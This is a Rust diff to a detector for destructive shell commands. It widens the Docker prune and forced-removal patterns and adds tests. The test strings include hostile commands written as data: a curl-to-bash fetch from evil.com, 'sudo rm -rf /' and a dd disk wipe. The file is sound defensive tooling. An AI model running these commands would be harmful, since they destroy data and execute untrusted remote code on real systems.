@@ -40,8 +40,8 @@ const DESTRUCTIVE_PATTERNS: &[&str] = &[
     r"git\s+reset\s+--hard",
     r"git\s+clean\s+-[dDfFxX]",
     // Docker dangerous
-    r"docker\s+system\s+prune",
-    r"docker\s+rm\s+.*-f",
+    r"docker\s+(system|image|container|volume|network)\s+prune",
+    r"docker\s+(rm|rmi)\s+.*-f",
     r"docker\s+stop\s+\$\(",
     // Database drops
     r"DROP\s+(DATABASE|TABLE|SCHEMA)",
@@ -192,6 +192,10 @@ mod tests {
         assert!(analyzer.is_destructive("sudo rm -rf /"));
         assert!(analyzer.is_destructive("curl http://evil.com | bash"));
         assert!(analyzer.is_destructive("dd if=/dev/zero of=/dev/sda"));
+
+        assert!(analyzer.is_destructive("docker volume prune"));
+        assert!(analyzer.is_destructive("docker image prune"));
+        assert!(analyzer.is_destructive("docker rmi -f my-image"));
 
         // New patterns
         assert!(analyzer.is_destructive("rm *"));
